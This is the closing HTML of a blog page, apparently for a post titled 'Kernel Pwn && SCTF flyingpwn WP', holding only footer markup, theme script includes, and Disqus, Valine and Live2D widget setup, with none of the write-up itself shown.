      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="site-pv" title="总访问量">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  













  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  

  
    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
  

  
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'http://yoursite.com/2021/12/29/KernelPwn/';
        this.page.identifier = '2021/12/29/KernelPwn/';
        this.page.title = 'Kernel Pwn && SCTF flyingpwn  WP';
        };
      function loadComments () {
        var d = document, s = d.createElement('script');
        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      }
      
        loadComments();
      
    </script>
  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
        placeholder: '',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: true
    });
  </script>



  





  

  

  

  

  
  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
</html>
